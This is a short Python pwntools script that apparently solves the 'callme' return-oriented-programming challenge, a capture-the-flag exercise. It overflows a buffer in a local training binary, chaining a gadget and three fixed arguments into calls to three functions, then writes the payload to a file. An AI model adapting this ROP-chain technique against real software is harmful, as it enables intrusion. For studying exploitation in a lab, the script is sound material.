from pwn import *  # Set up pwntools to work with this binary
from struct import *

p = process('./callme')
elf = ELF('./callme')
g = ROP(elf)

buf = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'


pop_param = 0x040093c  # gadget
call_one = 0x0000000000400720
call_two = 0x0000000000400740
call_three = 0x00000000004006f0

first_param = 0xdeadbeefdeadbeef
second_param = 0xcafebabecafebabe
third_param = 0xd00df00dd00df00d


params = p64(first_param) + p64(second_param) + p64(third_param)

#buf += p64(0x00000000004008f2)
buf += p64(pop_param)
buf += params
buf += p64(call_one)

buf += p64(pop_param)
buf += params
buf += p64(call_two)

buf += p64(pop_param)
buf += params
buf += p64(call_three)

print(buf)
with open('t', 'wb') as f:
    f.write(buf)
